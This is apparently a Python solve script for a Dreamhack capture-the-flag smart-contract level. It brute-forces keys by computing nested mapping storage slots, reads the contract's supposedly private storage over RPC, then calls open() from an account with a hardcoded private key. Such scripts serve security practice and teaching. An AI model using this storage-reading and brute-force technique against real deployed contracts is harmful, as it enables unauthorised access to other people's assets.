from eth_account import Account
from eth_account.signers.local import LocalAccount
from eth_typing import Address, ChecksumAddress, HexAddress, HexStr
from hexbytes import HexBytes
from web3 import Web3
from web3.contract import Contract

from storage_keccak import keccak_mapping

w3 = None


def get_key() -> int:
    global w3

    for key in range(650, 1000):
        a = key % 10
        b = (key // 10) % 10
        c = (key // 100) % 10

        s1 = keccak_mapping(a, 0)
        s2 = keccak_mapping(b, s1)
        s3 = keccak_mapping(c, s2)

        res: HexBytes = w3.eth.get_storage_at(
            Address(bytes.fromhex(level_contract_address.lstrip("0x"))),
            int.from_bytes(s3, "big"))

        # print(f"{a, b, c} -> {res}")
        if res != b'\x00' * 32:
            print(f"{a, b, c} -> {res}")
            return key


if __name__ == "__main__":
    rpc_url = "http://host3.dreamhack.games:21137/a27d3993fad4/rpc/"
    level_contract_address = "0x2d1363F37562908B113186f9Ece302D0245d271b"
    user_private_key = "0x672710ca12ef6a419225ca95bc243f0340362995a6ec05b8e6bb538902e60e41"
    account: LocalAccount = Account.from_key(user_private_key)

    w3 = Web3(Web3.HTTPProvider(rpc_url))

    abi = [{"inputs": [{"internalType": "bytes", "name": "value", "type": "bytes"}], "stateMutability": "nonpayable",
            "type": "constructor"},
           {"inputs": [{"internalType": "uint256", "name": "key", "type": "uint256"}], "name": "open", "outputs": [],
            "stateMutability": "nonpayable", "type": "function"},
           {"inputs": [], "name": "opened", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view", "type": "function"},
           {"inputs": [], "name": "triggered", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view", "type": "function"}]
    contract: Contract = w3.eth.contract(
        address=ChecksumAddress(HexAddress(HexStr(level_contract_address))),
        abi=abi
    )
    key = get_key()
    print(key)
    res = contract.functions.open(key).transact(
        {
            "from": account.address,
        }
    )
    print(res.hex())
